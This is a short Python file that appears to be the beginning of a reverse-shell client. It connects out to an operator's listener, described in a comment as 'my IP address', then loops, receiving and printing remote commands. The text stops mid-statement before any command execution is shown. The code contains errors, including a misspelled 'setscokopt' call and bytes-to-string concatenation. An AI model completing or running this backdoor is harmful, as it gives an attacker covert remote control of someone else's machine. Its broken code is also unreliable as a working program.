import socket
import subprocess, os

HOST = "localhost" # my IP address (needs to be input at some point)
PORT = 12345 # my port on which server is listening

# creating and connecting socket
connexion_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion_socket.setscokopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
connexion_socket.connect((HOST, PORT))
print ("\n[*] Connected to " +HOST+ " on port " +str(PORT)+ ".\n")

while True:

	command = connexion_socket.recv(1024)
	split_command = command.split()
	print ("Received command : " +command)

	#if it quit, then break out and close socket
	if command == "quit":
		break
	if 